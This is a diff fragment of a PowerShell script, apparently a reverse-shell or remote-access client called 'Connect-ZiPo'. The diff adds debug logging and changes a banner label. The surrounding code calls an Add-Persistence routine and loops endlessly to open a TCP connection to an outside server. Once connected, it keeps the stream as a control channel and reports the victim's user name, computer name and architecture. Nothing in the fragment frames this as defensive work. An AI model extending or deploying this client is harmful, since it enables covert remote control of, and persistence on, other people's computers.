@@ -614,11 +614,18 @@ schtasks /Delete /TN "$cleanupTask" /F >nul 2>&1
 
 
 
-    Add-Persistence
+      Add-Persistence
+    Output-Log "[*] Starting Connect-ZiPo..."
+    Output-Log "[*] Target server: $srv"
+    Output-Log "[*] Target port: $port"
+
     while ($true) {
         try {
+            Output-Log "[*] Attempting to connect to $srv:$port ..."
             $tcp = [Net.Sockets.TcpClient]::new($srv, $port)
             $stream = $tcp.GetStream()
+
+            Output-Log "[+] Successfully connected to $srv:$port"
 
             $global:clientStream = $stream
             
@@ -635,7 +642,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            TEST 4                                                                                                                                                                    
+                                            LOG CON TEST                                                                                                                                                                    
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
@@ -795,6 +802,8 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
             $tcp.Close()
         }
         catch {
+            $errorDetails = "[!] Failed to connect to $srv:$port -> $($_.Exception.Message)"
+            Output-Log $errorDetails
             Start-Sleep -Seconds 5
         }
     }
